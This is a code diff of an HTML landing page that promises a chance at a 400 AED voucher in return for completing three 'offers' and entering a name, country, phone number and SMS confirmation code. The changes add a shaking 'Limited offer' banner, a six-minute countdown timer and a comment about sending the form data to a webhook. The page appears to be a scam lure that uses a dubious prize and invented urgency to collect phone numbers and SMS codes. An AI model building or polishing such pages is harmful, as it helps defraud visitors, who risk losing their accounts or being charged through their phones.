@@ -7,17 +7,20 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: linear-gradient(to bottom, #f7f7f7, #e0e0e0);
+      background: linear-gradient(to bottom, #f9f9f9, #e0e0e0);
       margin: 0;
       padding: 0;
       text-align: center;
     }
+
     .container {
       padding: 20px;
     }
+
     h1, h2, h3 {
       margin: 10px 0;
     }
+
     .button-container {
       margin: 30px 0;
       display: flex;
@@ -25,10 +28,11 @@
       gap: 15px;
       align-items: center;
     }
+
     .offer-btn {
       padding: 15px 25px;
       font-size: 18px;
-      background-color: #ff5722;
+      background-color: #4CAF50;
       color: white;
       border: none;
       border-radius: 10px;
@@ -37,15 +41,18 @@
       width: 90%;
       max-width: 300px;
     }
+
     @keyframes pulse {
       0% { transform: scale(1); }
       50% { transform: scale(1.05); }
       100% { transform: scale(1); }
     }
+
     form {
       display: none;
       margin-top: 30px;
     }
+
     input {
       padding: 10px;
       margin: 10px;
@@ -53,27 +60,47 @@
       max-width: 300px;
       font-size: 16px;
     }
+
     .submit-btn {
       padding: 12px 20px;
-      background-color: #4caf50;
+      background-color: #4CAF50;
       color: white;
       border: none;
       border-radius: 8px;
       font-size: 18px;
       cursor: pointer;
     }
-    footer {
+
+    #limited-offer {
       margin-top: 40px;
       font-weight: bold;
       color: red;
+      font-size: 20px;
+      animation: shake 1s infinite;
+    }
+
+    @keyframes shake {
+      0% { transform: translate(1px, 0); }
+      25% { transform: translate(-1px, 0); }
+      50% { transform: translate(1px, 0); }
+      75% { transform: translate(-1px, 0); }
+      100% { transform: translate(1px, 0); }
+    }
+
+    #countdown {
+      font-size: 20px;
+      color: #ff0000;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <h1 id="main-title">Add your phone number and confirm the SMS code</h1>
-    <h2 id="subtitle1" style="color:#ff9800;">Get chance for 400 AED voucher</h2>
+    <h2 id="subtitle1" style="color:#4CAF50;">Get chance for 400 AED voucher</h2>
     <h3 id="subtitle2">Easy Steps . . . Complete the 3 offers then come back to this page to add your name and phone to contact you</h3>
+
+    <div id="countdown">Time left: 06:00</div>
 
     <div class="button-container">
       <button class="offer-btn" onclick="offerClicked()">Offer 1</button>
@@ -88,10 +115,30 @@
       <button class="submit-btn" type="submit">Submit</button>
     </form>
 
-    <footer><p id="limited-offer">Limited offer</p></footer>
+    <footer>
+      <p id="limited-offer">Limited offer</p>
+    </footer>
   </div>
 
   <script>
+    // Countdown Timer - 6 minutes
+    let timerDuration = 6 * 60;
+    const countdownEl = document.getElementById("countdown");
+
+    function updateCountdown() {
+      const minutes = String(Math.floor(timerDuration / 60)).padStart(2, '0');
+      const seconds = String(timerDuration % 60).padStart(2, '0');
+      countdownEl.textContent = `Time left: ${minutes}:${seconds}`;
+      if (timerDuration > 0) {
+        timerDuration--;
+        setTimeout(updateCountdown, 1000);
+      } else {
+        countdownEl.textContent = "Time expired!";
+      }
+    }
+    updateCountdown();
+
+    // Language Translation
     const translations = {
       en: {
         title: "Add your phone number and confirm the SMS code",
@@ -153,6 +200,7 @@
       document.getElementById("limited-offer").textContent = translations[lang].limitedOffer;
     });
 
+    // Offer logic
     let offersCompleted = 0;
     function offerClicked() {
       offersCompleted++;
@@ -167,7 +215,7 @@
       const country = document.getElementById("country").value;
       const phone = document.getElementById("phone").value;
       alert("Submitted! Thank you.");
-      // Replace this alert with your form handling logic or webhook
+      // Replace this alert with your webhook logic or backend request
     }
   </script>
 </body>
